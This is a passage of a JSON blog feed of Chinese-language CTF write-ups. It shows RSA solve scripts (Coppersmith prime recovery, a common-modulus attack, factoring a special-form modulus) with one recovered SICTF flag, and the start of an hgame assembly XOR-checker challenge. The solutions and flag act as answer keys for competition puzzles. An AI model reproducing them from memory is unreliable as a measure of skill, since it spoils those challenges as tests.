punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">**</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> num_in_base_10</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>decimal_conversion_back<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">112</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">109</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>decimal_conversion_back<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>leak1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">112</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">109</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#0xe0640a71f195151ec1ce19d2f279bdb781cd408c9c3e6cd98d52c685828cbf34|3dcf54f720d12f289219a8e129ad48ff74f5a6ffe3b9502a872bc176eb039c9a</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#0xe86194b49733b661b45654e0b6d7ec038e2815ce2b3ca16dcafda0b456f91e1e|752c3b385c8799bf36ebac684ae31c199eb59f6a4626ae786f811aa05d87a667</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#0xe0640a71f195151ec1ce19d2f279bdb781cd408c9c3e6cd98d52c685828cbf34|5f65ebf6b4b4d56880c2291ec13802ca68082513a08c63cd034f98a9d4f3261d</span></pre></td></tr></table></figure><p>取得 p 高位后 8bit 爆破即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p_high <span class=\"token operator\">=</span> <span class=\"token number\">0xe86194b49733b661b45654e0b6d7ec038e2815ce2b3ca16dcafda0b456f91e1e</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pbits<span class=\"token operator\">=</span><span class=\"token number\">512</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> trange<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p_high<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p4 <span class=\"token operator\">+</span> i</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        kbits <span class=\"token operator\">=</span> pbits <span class=\"token operator\">-</span> p4<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p4 <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        f <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> p4</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span> epsilon<span class=\"token operator\">=</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> roots<span class=\"token punctuation\">:</span>        </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                p <span class=\"token operator\">=</span> p4<span class=\"token operator\">+</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> n<span class=\"token operator\">%</span>p<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>然后正常 rsa</p>\n<h4 id=\"superbrsa\"><a class=\"markdownIt-Anchor\" href=\"#superbrsa\">#</a> SuperbRSA</h4>\n<blockquote>\n<p>最终分数 239 pts</p>\n</blockquote>\n<blockquote>\n<p>CRYPTO 真的很难吗？Ö_O 不会吧不会吧！，一定要相信自己咩～</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#user:mumu666</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e1<span class=\"token operator\">=</span><span class=\"token number\">55</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e2<span class=\"token operator\">=</span><span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></pre></td></tr></table></figure><p>e1 e2 不互素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> gcdext<span class=\"token punctuation\">,</span> iroot</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">55</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>g<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">=</span>gcdext<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span>e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>m<span class=\"token operator\">=</span>iroot<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"签到确信\"><a class=\"markdownIt-Anchor\" href=\"#签到确信\">#</a> 签到，确信！</h4>\n<p>未出但写</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> enc <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_keys</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        q <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            r <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q<span class=\"token operator\">*</span>r</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>n</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">,</span>n <span class=\"token operator\">=</span> gen_keys<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>R <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    Q <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>quo<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    pp1 <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> pp1 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pp1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        qq <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>pp1<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        rr <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>pp1 <span class=\"token operator\">*</span> qq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">assert</span> n <span class=\"token operator\">==</span> pp1 <span class=\"token operator\">*</span> qq <span class=\"token operator\">*</span> rr</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">12682901567122222027862267249598083531042605533994291954963094692106317834600627170541482405569672263127679934367189535951903117852500278279000920954628951</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>r <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p<span class=\"token operator\">//</span>q </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#b'SICTF&#123;d9428fc7-fa3a-4096-8ec9-191c0a4562ff&#125;'</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#原文链接：https://blog.csdn.net/m0_62584492/article/details/134758030</span></pre></td></tr></table></figure><h3 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h3>\n<h4 id=\"gamebattle-city\"><a class=\"markdownIt-Anchor\" href=\"#gamebattle-city\">#</a> Game[Battle City]</h4>\n<p>打游戏出的，二维码就在那个文件夹中</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2024/02/05/hgame-week1-wp/",
            "url": "http://example.com/2024/02/05/hgame-week1-wp/",
            "title": "hgame-week1-wp",
            "date_published": "2024-02-05T14:56:17.000Z",
            "content_html": "<h1 id=\"hgame_wp_week1\"><a class=\"markdownIt-Anchor\" href=\"#hgame_wp_week1\">#</a> Hgame_wp_week1</h1>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240204145551962.png\" alt=\"image-20240204145551962\"></p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240205175025173.png\" alt=\"image-20240205175025173\"></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"ezasm100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezasm100pt\">#</a> ezASM(100pt)</h3>\n<blockquote>\n<p>To learn a little ASM</p>\n</blockquote>\n<p>题目：</p>\n<pre><code class=\"language-assembly\">section .data\n    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34\n    flag db 33 dup(0)\n    format db &quot;plz input your flag: &quot;, 0\n    success db &quot;Congratulations!&quot;, 0\n    failure db &quot;Sry, plz try again&quot;, 0\n\nsection .text\n    global _start\n\n_start:\n    ; Print prompt\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, format\n    mov edx, 20\n    int 0x80\n\n    ; Read user input\n    mov eax, 3\n    mov ebx, 0\n    mov ecx, flag\n    mov edx, 33\n    int 0x80\n\n    ; Check flag\n    xor esi, esi\ncheck_flag:\n    mov al, byte [flag + esi]\n    xor al, 0x22\n    cmp al, byte [c + esi]\n    jne failure_check\n\n    inc esi\n    cmp esi, 33\n    jne check_flag\n\n    ; Print success message\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, success\n    mov edx, 14\n    int 0x80\n\n    ; Exit\n    mov eax, 1\n    